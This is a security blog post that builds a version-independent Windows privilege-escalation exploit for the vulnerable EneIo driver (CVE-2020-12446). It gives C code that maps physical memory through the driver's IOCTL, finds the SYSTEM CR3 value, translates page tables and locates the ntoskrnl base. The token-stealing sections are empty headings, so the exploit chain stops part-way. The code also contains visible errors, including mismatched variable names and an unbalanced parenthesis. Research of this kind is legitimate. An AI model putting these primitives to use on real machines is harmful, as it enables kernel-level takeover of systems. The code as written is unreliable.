[Home](https://plackyhacker.github.io)

# Version Independent Physical Memory Read/Write Privilege Escalation

This is my first post since passing the [Offensive Security Exploitation Expert](https://www.offsec.com/courses/exp-401/) exam. I suppose it is now time to start practicing my chosen tradecraft. I am currently studying a vulnerability that was discovered in early 2025, was being used in ransomware attacks, but doesn't have a public exploit (that I am aware of). I will be posting something about that shortly.

This got me thinking about how I might write a privilege escalation exploit that is operating system version independent. I decided to look at [CVE-2020-12446](https://nvd.nist.gov/vuln/detail/CVE-2020-12446) which has multiple vulnerabilities leading to privilege escalation and has at least [one public exploit](https://xacone.github.io/eneio-driver.html) already.

**Note:** The CVE isn't really what I am interested in, any CVE with a physical read/write primitive (exposing `ZwMapViewOfSection` and not `MmMapIoSpace`) would do.

## The Basics

If you are reading this then I assume you know how a driver works and how we can connect to it from user-mode. If not, feel free to read some of my other posts. The symbolic name for the driver is `\\.\EneIo` and the vulnerable IOCTL I decided to target is `0x80102040`. Short story: this IOCTL maps the physical memory in kernel-space to a virtual address space in user-space.

The code snippet below shows how we can map the physical memory space to a virtual allocation:

```c
// user-mode data structure
typedef struct _MAPPHYSTOVA {
    ULONGLONG Size;
    ULONGLONG Ignore2;
    ULONGLONG Ignore3;
    ULONGLONG MappingAddress;
    ULONGLONG Ignore5;
} MAPPHYSTOVA, * PMAPPHYSTOVA;

// ...


// send IOCTL to map memory
ULONGLONG MapMemory(HANDLE hDevice, ULONGLONG* SizeOfMapping) {
    DWORD bytesReturned = 0;

    MAPPHYSTOVA map = { 0 };

    BOOL result = DeviceIoControl(hDevice, IOCTL_WINIO_MAPPHYSTOVA, &map, sizeof(map), &map, sizeof(map), &bytesReturned, NULL);

    *SizeOfMapping = map.Size;
    return mapIn.MappingAddress;
}
```

The struct contains five `ULONGLONG` fields but only two of them are used: `Size` is the size of the mapping, and `MappingAddress` the virtual allocation that has been assigned by the kernel. Notice that the `map` variable is passed in as the user input and the user output. Once the `DeviceIOControl` is completed the `map` variable is populated with the two relevant variables.

## Virtual Address to Physical Memory Mapping

There are several explanations on how virtual to physical memory mapping works on x64 architecture so I won't go into a great amount of detail here, my absolute favourite is [Demistifying Physical Memory Primitive Exploitation on Windows](https://0dr3f.github.io/Demystifying_Physical_Memory_Primitive_Exploitation_on_Windows). Here you will get the short version!

<img alt="Screenshot 2025-10-15 at 07 34 13" src="https://github.com/user-attachments/assets/96f43b89-b79f-4bf3-8d8d-a2c4c98aa0d3" style="border: 1px solid black;" />

The diagram above is taken directly from the Intel software developers manual. Each process has a series of page tables, and each virtual address in that process maps to physical memory using them. This is why multiple processes can have the same virtual address space; because they don't conflict in physical address space. Also notice that this processing scheme only actually permit 48-bits of address space, not the 64-bits as might be expected.

Each field in the virtual address is an offset to the next entry in a page table, bits 39 - 47 are the offset of the PML4E in the PML4 table. The PML4E contains a Page Frame Number (PFN). The PFN points to the base of the next table, and so forth until the offset is reached for the final physical address.

Also notice that each process stores the base address of the PML4 table (essentially the starting point for page translation).

A page table entry is shown below:

<img alt="Screenshot 2025-10-15 at 07 39 20" src="https://github.com/user-attachments/assets/b29bfc38-acaf-474b-807d-c90b222091b8" style="border: 1px solid black;" />

The PFN is located in bits 12 to 51 so it needs to be extracted using an `AND` operation: `PTE & 0x0000FFFFFFFFF000`.

Now we have all the pieces the following code snippet shows how the translation might be made (more on this later):

```c
// ...
PAGE_TABLE_INDICES indices;
ExtractPageTableIndices(VirtualAddressToResolve, &indices);

ULONGLONG pml4e = *((ULONGLONG*)(UserModeAddress + PmlBase + (8 * indices.pml4Index)));
ULONGLONG pdpt = pml4e & 0xFFFFFFFF000;
// ..
```

The `cr3` register value is crucial; without it page table translations cannot be made.

## Discovering the CR3 Value

In the Windows OS the `HalpLMStub` function is the final stub call, in a series of stubs, that applies page tables and performs various initialisation before jumping to the main kernel. A reference to this function is written to physical memory between addresses `0x10000` and `0x20000` and is randomised. 

Within the same page is a value that is to be loaded in to the `SYSTEM` `cr3` register. The `cr3` register contains a pointer to the first page table, the PML4 table.

To make things easier the two values are at predictable locations within the page. The `HalpLMStub` pointer is at offset `+0x70` and the `cr3` value is at offset `+0xa0`.

Once we have a mapping of physical memory we can search the pages between `0x10000` and `0x20000` and do pattern matching at these offsets to find the page which the stub pointer exists and the base address of the PML4 table.

```c
DWORD FindCR3Value(ULONGLONG VirtualAddressBase, DWORD* cr3Page) {
    // the final stub reference is always between 0x10000 and 0x20000
    for (DWORD page = 0x10000; pageIndex <= 0x20000; pageIndex += 0x1000) {
        // CR3 value is at an offset of 0xA0
        DWORD64 potential_cr3 = *((DWORD64*)((BYTE*)VirtualAddressBase + page + 0xA0));

        if ((potential_cr3 & 0xFFF) == 0 &&
            ((potential_cr3 >> 12) & 0xF) != 0 && ((potential_cr3 >> 16) & 0xF) != 0 && ((potential_cr3 >> 20) & 0xF) != 0 &&
            (potential_cr3 >> 24) == 0) {

            // halpLMStub reference is at an offset of 0x70
            DWORD64 checkHalpLMStub = *((DWORD64*)(BYTE*)VirtualAddressBase + page + 0x70));
            if ((checkHalpLMStub & 0xfffff80000000000) == 0xfffff80000000000) {
                *cr3Page = page;
                return ((DWORD)potential_cr3 & 0xFFFFFFFF);
            }
        }
    }

    return 0;
}
```

Now we have a reference to the `SYSTEM` page tables it would make sense to go for the `ntoskrnl` base address. We have a reference to the `HalpLMStub` function which is at an offset to the base of `ntoskrnl`. In normal circumstances we might use WinDbg to find that offset but I want to explore how I could make it version independant.

## Discovering NTOSKRNL Base

What I decided to try out was to take the mapped memory (`VirtualAddressBase`) and search it looking for the first `MZ` value in memory. To ensure it was the `ntoskrnl` header signature I started searching at an address way before the function address after masking out the five least significant nibbles (love that word). 

```c
ULONGLONG GetNtBaseFromCR3Page(ULONGLONG VirtualAddressBase, DWORD cr3Page, DWORD cr3) {
    // read the function address
    DWORD64 halpLMStub = *((DWORD64*)(VirtualAddressBase + (ULONGLONG)cr3Page) + 0xe);

    // try to find MZ
    for (ULONGLONG i = 0x100000; i > 0x0; i--) {
        ULONGLONG read = (halpLMStub & 0xfffffffffff00000) - (i * 0x1000);

        ULONGLONG physAddr = GetPhysicalAddress(cr3, read, VirtualAddressBase);
        ULONGLONG possibleBase = *((DWORD64*)(VirtualAddressBase + physAddr));

        if ((possibleBase & 0xffff) == 0x5a4d) {
            return read;
        }
    }

    // failed
    return 0x0;
}
```

I'm sure somebody could make this more efficient... but it works. Another thought was that I could translate the `HalpLMStub` to a physical address using the `GetPhysicalAddress` function and do a more targetted search for the signature.

The helper functions are shown below (if you are using the code don't forget the struct I haven't included):

```c
void ExtractPageTableIndices(DWORD64 virtualAddress, PAGE_TABLE_INDICES* indices)
{
    indices->pml4Index = (virtualAddress >> 39) & 0x1FF;     // Bits 39-47
    indices->pdpIndex = (virtualAddress >> 30) & 0x1FF;      // Bits 30-38
    indices->pdIndex = (virtualAddress >> 21) & 0x1FF;       // Bits 21-29
    indices->ptIndex = (virtualAddress >> 12) & 0x1FF;       // Bits 12-20
    indices->offset = virtualAddress & 0xFFF;                // Bits 0-1
}

ULONGLONG GetPhysicalAddress(ULONGLONG PmlBase, ULONGLONG VirtualAddressToResolve, ULONGLONG UserModeAddress) {
    PAGE_TABLE_INDICES indices;
    ExtractPageTableIndices(VirtualAddressToResolve, &indices);

    ULONGLONG pml4e = *((ULONGLONG*)(UserModeAddress + PmlBase + (8 * indices.pml4Index)));
    ULONGLONG pdpt = pml4e & 0xFFFFFFFF000;

    ULONGLONG pdpte = *((DWORD64*)(UserModeAddress + pdpt + (8 * indices.pdpIndex)));
    ULONGLONG pdt = pdpte & 0xFFFFFFFF000;

    ULONGLONG pde = *((DWORD64*)(UserModeAddress + pdt + (8 * indices.pdIndex)));

    // is the 'large-page' flag set
    if (pde & (1ULL << 7)) {
        ULONGLONG pte = pde & 0xFFFFFFFF000;
        pte += (indices.ptIndex << 12);
        pte += indices.offset;
        return pte;
    }
    else {
        // todo: kernel seems to be mapped as large pages so don't care for now
        return 0;
    }
}
```

Running the PoC in Windows 2022 Datacenter (for Azure cloud licensing reasons) shows that we are successful:

<img width="805" alt="Screenshot 2025-02-12 at 20 06 05" src="https://github.com/user-attachments/assets/261da7e4-f34a-46eb-949f-3fd7ca0cf16e" style="border: 1px solid black;" />



## Discovering Processes

## Discovering Privileged Processes

## Token Stealing

## Conclusion

[Home](https://plackyhacker.github.io)
